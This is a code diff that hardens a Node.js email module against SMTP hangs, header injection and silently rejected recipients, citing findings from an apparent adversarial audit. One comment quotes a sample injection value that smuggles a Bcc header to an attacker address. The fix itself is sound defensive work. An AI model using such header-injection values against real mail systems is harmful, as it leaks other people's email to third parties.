@@ -21,13 +21,29 @@ const nodemailer = require('nodemailer');
 
 let _transporter;
 
+// Adversarial audit F2-email (2026-04-15): bounded SMTP timeouts.
+// nodemailer's defaults for connectionTimeout/greetingTimeout/
+// socketTimeout are each 10 minutes. If the SMTP provider hangs,
+// sendLoginCode (called inline from POST /auth/login before the
+// HTTP response flushes) would block the user-facing request for
+// up to ~30 minutes before Node's TCP defaults kicked in. The
+// caller's timeout wrappers can't help because createTransport
+// doesn't propagate them. Cap each phase so a dead SMTP server
+// surfaces within ~15s.
+const SMTP_CONNECTION_TIMEOUT_MS = 10_000;
+const SMTP_GREETING_TIMEOUT_MS = 10_000;
+const SMTP_SOCKET_TIMEOUT_MS = 15_000;
+
 function getTransporter() {
   if (!_transporter) {
     _transporter = nodemailer.createTransport({
       host: process.env.SMTP_HOST,
-      port: parseInt(process.env.SMTP_PORT || '587'),
+      port: parseInt(process.env.SMTP_PORT || '587', 10),
       secure: process.env.SMTP_PORT === '465',
       requireTLS: process.env.SMTP_PORT !== '465',
+      connectionTimeout: SMTP_CONNECTION_TIMEOUT_MS,
+      greetingTimeout: SMTP_GREETING_TIMEOUT_MS,
+      socketTimeout: SMTP_SOCKET_TIMEOUT_MS,
       auth: {
         user: process.env.SMTP_USER,
         pass: process.env.SMTP_PASS,
@@ -35,6 +51,45 @@ function getTransporter() {
     });
   }
   return _transporter;
+}
+
+// Adversarial audit F1-email (2026-04-15): sanitize any value that
+// flows into an SMTP header (primarily the `subject:` field). The
+// call sites interpolate operator-controlled strings like
+// `api_key.label` and `alert_rules.name` into subject templates.
+// Nodemailer is SUPPOSED to strip newlines from header values, but
+// relying on upstream defense when the fix costs two lines at the
+// interpolation site is weak. An operator who set a label like
+//     "Evil\r\nBcc: attacker@evil.com"
+// could otherwise inject a BCC header and exfiltrate transactional
+// email content to an arbitrary address. The attack surface is
+// narrow (self-attack by a dashboard owner on their own
+// transactional mail), but header injection is a primitive that
+// should never reach nodemailer regardless of the threat model.
+//
+// Strip CR, LF, and all C0 control characters. Also cap at 200
+// chars because subject lines longer than that are either a caller
+// bug or hostile. Callers that need more space should use the body.
+function sanitizeHeader(value) {
+  if (value === null || value === undefined) return '';
+  const str = String(value);
+  return str.replace(/[\x00-\x1f\x7f]/g, ' ').slice(0, 200);
+}
+
+// Wrap sendMail so a rejected-recipient result surfaces as a throw.
+// Nodemailer's sendMail resolves successfully even if the SMTP
+// server rejected one or more recipients — the rejection info lands
+// in `info.rejected`. Callers that await sendMail without checking
+// the result would believe the email was delivered when it wasn't.
+// Adversarial audit F3-email.
+async function sendMailStrict(transporter, options) {
+  const info = await transporter.sendMail(options);
+  if (info && Array.isArray(info.rejected) && info.rejected.length > 0) {
+    throw new Error(
+      `SMTP rejected ${info.rejected.length} recipient(s): ${info.rejected.join(', ')}`,
+    );
+  }
+  return info;
 }
 
 // Wrap the bare address in SMTP_FROM with a display name so inboxes show
@@ -213,8 +268,11 @@ async function sendLoginCode(email, code) {
   // claimed the preheader carried the code; the actual behaviour
   // was already code-free and that's the security-correct choice.
   // Adversarial audit F2-email.
+  // Subject is a constant — no interpolation means no header-injection
+  // vector here. Still routed through sendMailStrict to surface any
+  // per-recipient rejection instead of silently succeeding.
   const subject = 'Your Cards402 login code';
-  await getTransporter().sendMail({
+  await sendMailStrict(getTransporter(), {
     from: from(),
     to: email,
     subject,
@@ -259,10 +317,16 @@ async function sendApprovalEmail(
     ${button(DASHBOARD_URL, 'Review in dashboard')}
     <p style="margin:26px 0 0 0;color:${COLOR.faint};font-size:13px;">This request expires in 2 hours. Approval ID: <span style="font-family:${FONT_MONO};">${escapeHtml(approvalId)}</span></p>
   `;
-  await getTransporter().sendMail({
+  // F1-email: sanitize any operator-controlled value before it
+  // lands in SMTP headers. amountUsdc comes from the validated
+  // orders.amount_usdc column (digit-string only) so it's already
+  // safe, but pipe it through sanitizeHeader uniformly so future
+  // refactors don't re-open the surface.
+  const safeSubject = `Cards402 — approval required for $${sanitizeHeader(amountUsdc)} USDC`;
+  await sendMailStrict(getTransporter(), {
     from: from(),
     to: ownerEmail,
-    subject: `Cards402 — approval required for $${amountUsdc} USDC`,
+    subject: safeSubject,
     text: [
       `An agent is requesting approval for a $${amountUsdc} USDC transaction.`,
       ``,
@@ -277,7 +341,7 @@ async function sendApprovalEmail(
       ``,
       `— cards402.com`,
     ].join('\n'),
-    html: wrap(`An agent needs approval for $${amountUsdc} USDC`, body),
+    html: wrap(`An agent needs approval for $${sanitizeHeader(amountUsdc)} USDC`, body),
   });
 }
 
@@ -299,10 +363,23 @@ async function sendSpendAlertEmail(ownerEmail, { keyLabel, pct, spentUsdc, limit
     </table>
     ${button(DASHBOARD_URL, 'Review in dashboard')}
   `;
-  await getTransporter().sendMail({
+  // F1-email: keyLabel is operator-controlled (api_keys.label, set at
+  // create time from the dashboard POST body). The old code interpolated
+  // it directly into the SMTP subject, which — even if nodemailer
+  // stripped newlines — was the right shape for a header-injection
+  // pivot if upstream sanitization ever failed. sanitizeHeader strips
+  // CR/LF/control chars before we hand the string to nodemailer.
+  // pct and limitType are backend-generated numeric / enum strings
+  // but pipe them through uniformly so future changes don't re-open
+  // the surface.
+  const safeLabel = sanitizeHeader(keyLabel);
+  const safePct = sanitizeHeader(pct);
+  const safeLimitType = sanitizeHeader(limitType);
+  const safeSubject = `Cards402 — ${safeLabel} at ${safePct}% of ${safeLimitType} limit`;
+  await sendMailStrict(getTransporter(), {
     from: from(),
     to: ownerEmail,
-    subject: `Cards402 — ${keyLabel} at ${pct}% of ${limitType} limit`,
+    subject: safeSubject,
     text: [
       `Agent "${keyLabel}" has reached ${pct}% of its ${limitType} spend limit.`,
       ``,
@@ -313,7 +390,7 @@ async function sendSpendAlertEmail(ownerEmail, { keyLabel, pct, spentUsdc, limit
       ``,
       `— cards402.com`,
     ].join('\n'),
-    html: wrap(`${keyLabel} at ${pct}% of its ${limitType} spend limit`, body),
+    html: wrap(`${safeLabel} at ${safePct}% of its ${safeLimitType} spend limit`, body),
   });
 }
 
@@ -323,19 +400,24 @@ async function sendSpendAlertEmail(ownerEmail, { keyLabel, pct, spentUsdc, limit
 // Note: getTransporter() always returns a transporter — the previous
 // `if (!transporter) return;` guard was dead code (F3-email).
 async function sendAlertEmail({ to, subject, body }) {
-  const transporter = getTransporter();
+  // F1-email: `subject` reaches here already templated by
+  // lib/alerts.js::deliverFiring as `cards402 alert: ${rule.name}`,
+  // which makes rule.name (operator-controlled at rule creation
+  // time) an interpolation source for the SMTP header. Pass it
+  // through sanitizeHeader before sendMail.
+  const safeSubject = sanitizeHeader(subject);
   const htmlBody = `
     ${eyebrow('Alert')}
-    ${headline(escapeHtml(subject))}
+    ${headline(escapeHtml(safeSubject))}
     <p style="margin:0 0 24px 0;color:${COLOR.muted};font-size:14px;line-height:1.65;">${escapeHtml(body)}</p>
     ${button(DASHBOARD_URL, 'Open dashboard')}
   `;
-  await transporter.sendMail({
+  await sendMailStrict(getTransporter(), {
     from: from(),
     to,
-    subject,
+    subject: safeSubject,
     text: `${body}\n\n— cards402.com`,
-    html: wrap(subject, htmlBody),
+    html: wrap(safeSubject, htmlBody),
   });
 }
 
